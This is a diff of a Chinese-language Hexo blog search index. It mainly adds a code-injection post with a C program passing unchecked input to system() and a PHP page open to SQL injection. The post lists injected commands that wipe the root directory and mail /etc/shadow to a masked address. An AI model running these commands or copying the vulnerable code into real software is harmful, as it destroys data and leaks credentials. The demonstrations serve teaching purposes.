@@ -3,7 +3,7 @@
   <entry>
     <title><![CDATA[代码注入]]></title>
     <url>%2F2017%2F12%2F14%2F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%2F</url>
-    <content type="text"><![CDATA[c程序代码注入c程序:123456789101112131415#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123; char src[100], dst[100], cmd[205] = "cp "; printf("Please enter name of source file:"); gets(src); strcat(cmd, src); strcat(cmd, " "); printf("Please enter name of destination file:"); gets(dst); strcat(cmd, dst); system(cmd); return 0;&#125; 程序本身是要求输入一个拷贝源文件和拷贝目标文件，将源文件内容拷贝到目标文件,正常执行: 异常代码注入 同时还能干这些事情删除根目录，你可以试试1cp hello world; rm -rf / --no-preserve-root 将linux系统的密码文件通过邮件发送1cp hello world; mail ****@****.com &lt; /etc/shadow]]></content>
+    <content type="text"><![CDATA[c程序代码注入c程序:123456789101112131415#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123; char src[100], dst[100], cmd[205] = "cp "; printf("Please enter name of source file:"); gets(src); strcat(cmd, src); strcat(cmd, " "); printf("Please enter name of destination file:"); gets(dst); strcat(cmd, dst); system(cmd); return 0;&#125; 程序本身是要求输入一个拷贝源文件和拷贝目标文件，将源文件内容拷贝到目标文件,正常执行: 异常代码注入 同时还能干这些事情删除根目录，你可以试试1cp hello world; rm -rf / --no-preserve-root 将linux系统的密码文件通过邮件发送1cp hello world; mail ****@****.com &lt; /etc/shadow SQL代码注入index.html1234567891011121314151617181920212223&lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous"&gt; &lt;script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"&gt;&lt;/script&gt;&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"&gt;&lt;/script&gt;&lt;script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"&gt;&lt;/script&gt; &lt;title&gt;sql 注入测试&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div class="card" style="width: 20rem;"&gt; &lt;div class="card-body"&gt; &lt;form method="POST" action="index.php"&gt; &lt;div class="form-group"&gt; &lt;label class="col-form-label" for="formGroupExampleInput"&gt;SQL query&lt;/label&gt; &lt;input type="text" class="form-control" name="content" id="content" placeholder="Example input"&gt; &lt;/div&gt; &lt;button type="submit" class="btn btn-primary"&gt;Submit&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; index.php123456789101112131415161718192021222324252627282930313233343536373839&lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous"&gt; &lt;script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"&gt;&lt;/script&gt; &lt;script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"&gt;&lt;/script&gt; &lt;script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"&gt;&lt;/script&gt; &lt;title&gt;SQL 注入&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php if ($_POST[content]) &#123; $db_host = "localhost"; $db_user = "my_user"; $db_password = "my_password"; $db_name = "my_db"; $content = $_POST[content]; $query = "SELECT * FROM users WHERE name = '$content'"; $conn = mysqli_connect($db_host,$db_user,$db_password,$db_name); $result = mysqli_query($conn, $query); var_dump(); if (mysqli_num_rows($result)) &#123; while ($row = mysqli_fetch_array($result)) &#123; echo "Your name is " . $row[1] . "&lt;/br&gt;"; &#125; &#125; else &#123; echo "No Found!"; &#125; mysqli_close($conn); &#125; else &#123; var_dump($_POST); echo "Don't get your content!"; &#125; ?&gt; &lt;/body&gt;&lt;/html&gt; 表中数据正常输入异常输入]]></content>
       <categories>
         <category>安全</category>
       </categories>
@@ -338,11 +338,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[吐槽]]></title>
-    <url>%2F2016%2F05%2F21%2Fmy-note1%2F</url>
-    <content type="text"><![CDATA[我必须来吐槽一下，搞了两天了来搭建自己的博客，然而出现各种莫名其妙的东西，让我很是难受，我已经合理怀疑自己的智商了。不过话说回来上次在网上瞎做了一个智商测试，测试出来我居然有143的天才智商，真的假的。]]></content>
-  </entry>
-  <entry>
     <title><![CDATA[Git install and setting]]></title>
     <url>%2F2016%2F05%2F21%2Fgit-install%2F</url>
     <content type="text"><![CDATA[git install and setting:123$ git config --global user.name "name"$ git config --global user.email "email"$ git config --global color.ui auto and then create a new directory as tutorial123$ mkdir tutorial$ cd tutorial$ git init then create a new file as text.txt123456$ git status$ git add text.txt$ git status$ git commit -m "text"$ git status$ git log next to rename the “https://…….” as origin123$ git remote add origin https://.........(do this only the first time)$ git push -u origin master(the first time)$ git push -u origin(do this the next time) do clone1$ git clone https://....... tutorial2(a new directory) do pull file in your date-base12$ git pull origin master$ git log finally do another setting to make it better,but I meet a problem.So I stop it temporarily,continue it if I have time.]]></content>
@@ -352,6 +347,11 @@
       <tags>
         <tag>git</tag>
       </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[吐槽]]></title>
+    <url>%2F2016%2F05%2F21%2Fmy-note1%2F</url>
+    <content type="text"><![CDATA[我必须来吐槽一下，搞了两天了来搭建自己的博客，然而出现各种莫名其妙的东西，让我很是难受，我已经合理怀疑自己的智商了。不过话说回来上次在网上瞎做了一个智商测试，测试出来我居然有143的天才智商，真的假的。]]></content>
   </entry>
   <entry>
     <title><![CDATA[Hello World]]></title>
